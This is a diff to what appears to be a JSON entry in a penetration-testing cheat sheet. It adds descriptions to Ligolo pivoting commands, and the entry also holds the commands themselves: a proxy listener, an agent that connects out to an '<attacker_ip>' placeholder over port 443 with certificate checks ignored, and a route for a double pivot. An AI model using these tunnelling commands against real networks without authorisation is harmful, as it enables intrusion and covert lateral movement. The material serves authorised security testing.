@@ -104,15 +104,18 @@
   "variations": [
     {
       "label": "Proxy with a custom listen port",
-      "command": "./proxy -selfcert -laddr 0.0.0.0:443"
+      "command": "./proxy -selfcert -laddr 0.0.0.0:443",
+      "description": "Proxy with a custom listen port. See the command syntax for exact parameters and flags."
     },
     {
       "label": "Agent over an allowed egress port (443)",
-      "command": "./agent -connect <attacker_ip>:443 -ignore-cert"
+      "command": "./agent -connect <attacker_ip>:443 -ignore-cert",
+      "description": "Agent over an allowed egress port (443). See the command syntax for exact parameters and flags."
     },
     {
       "label": "Add another internal route (double pivot)",
-      "command": "sudo ip route add <second_subnet>/24 dev ligolo"
+      "command": "sudo ip route add <second_subnet>/24 dev ligolo",
+      "description": "Uses Ligolo for creating tunnels and pivoting to internal networks. Provides a virtual network interface on the attacker side for seamless access to internal subnets."
     }
   ],
   "type": "command",
